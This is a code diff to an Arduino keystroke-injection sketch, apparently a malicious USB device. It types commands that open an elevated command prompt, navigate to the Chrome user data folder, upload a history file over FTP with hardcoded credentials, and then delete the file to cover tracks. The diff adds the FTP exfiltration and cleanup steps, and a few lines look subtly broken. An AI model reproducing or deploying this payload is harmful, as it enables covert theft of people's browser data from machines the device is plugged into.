@@ -31,7 +31,7 @@ Keyboard.begin();
   Keyboard.print("powershell Start-Process cmd -Verb runAs");
   delay(500);
   typeKey(KEY_RETURN);
-  delay(2000);
+  delay(3000);
   
   Keyboard.write(0xD8);
  
@@ -43,7 +43,7 @@ Keyboard.begin();
   // # Now to grab the file
   // *****************
   Keyboard.print("cd \"%LocalAppData%\\Google\\Chrome\\User Data\\Default");
-  delay(50);
+  delay(500);
   typeKey(KEY_RETURN);
   delay(500);
  
@@ -54,29 +54,48 @@ Keyboard.begin();
   (30);
   typeKey(KEY_RETURN);
   delay(1000);
-  Keyboard.print("powershell");
+  
+  Keyboard.print("cd \"%USERPROFILE%");
   delay(20);
   typeKey(KEY_RETURN);
-  
-
+   // *****************
+  // Opening connection to external FTP server
   // *****************
-  // # send it to Email
+  // Enter Host Name
+  Keyboard.print("ftp -i 127.0.0.1"); 
+  delay(30);
+  typeKey(KEY_RETURN);
+  delay(800);
+   
+  // Enter Username and Passwd
+   Keyboard.print("sap");
+   typeKey(KEY_RETURN); 
+   delay(100);
+   
+   Keyboard.print("sap");
+   delay(20);
+   typeKey(KEY_RETURN);
+   delay(60);
+   
+   Keyboard.press("put C:\\History");
+   typeKey(KEY_RETURN);
+   delay(10000);
+   Keyboard.print("quit");
+   delay(30);
+   typeKey(KEY_RETURN);
+   
+   
   // *****************
- 
-  
+  //  Cleanup
   // *****************
-  // # Cleanup
-  // *****************
- // Keyboard.print("del C:\\Information.txt");
-
-  //typeKey(KEY_RETURN);
-
-//  Keyboard.print("exit");
-
-//  typeKey(KEY_RETURN);
+  Keyboard.print("del  C:\\History");
+  delay(60);
+  typeKey(KEY_RETURN);
+  Keyboard.print("exit");
+  typeKey(KEY_RETURN);
 
   // Ending stream
- // Keyboard.end();
+   Keyboard.end();
 }
 
 
